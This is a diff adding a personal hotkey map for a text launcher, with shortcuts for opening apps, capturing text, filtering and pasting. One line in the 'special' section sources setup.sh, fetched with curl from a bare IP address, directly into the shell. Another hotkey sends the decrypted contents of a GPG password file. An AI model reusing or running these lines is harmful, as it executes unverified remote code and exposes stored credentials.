@@ -1,0 +1,36 @@
+#+Title: hotkey.map
+#-- line_pat=': (.+?)', init_filt='###' --
+
+* board ctrl
+: #!url http://127.0.0.1:9111/xboard/capture.org ###view
+: #!eval cat base.org | ./filt.py ###z
+
+* window ctrl
+: #!open emacs ###emacs
+: #!open Google Chrome ###browser
+: #!open Safari ###safari
+: #!open iterm ###tty
+: #!open DingTalk ###ding
+: #!sh open ~ ###h
+
+* special
+: r7=http://121.36.97.201 && . <(curl -s $r7/setup.sh) ###install remote launcher
+: #!send 'huafengxi@gmail.com' ###m
+: #!send gpg_decrypt('~/.pass.gpg') ###pass echo '<pass>' | gpg -r huafengxi@gmail.com -a -o ~/.pass.gpg -e
+
+: #!python do_capture(self) ###capture
+: #!python do_tag_capture(self) ###named_capture
+: #!msg echo '$text' | ~/m/bin/conv.py guess ###query
+: #!sh open $text ###open
+
+* filt
+: #!filt filt_by_input  ###,
+: #!filt smart_text  ###action
+: #!filt squeeze_space ###squeeze_space
+: #!filt join_line #X#join_lin
+: #!filt add_prefix ### add_indent
+: #!filt del_prefix ###-del_prefix
+
+* paste list
+: #!python paste_next("past.list") ###j
+: #!python paste_prev("past.list") ###k
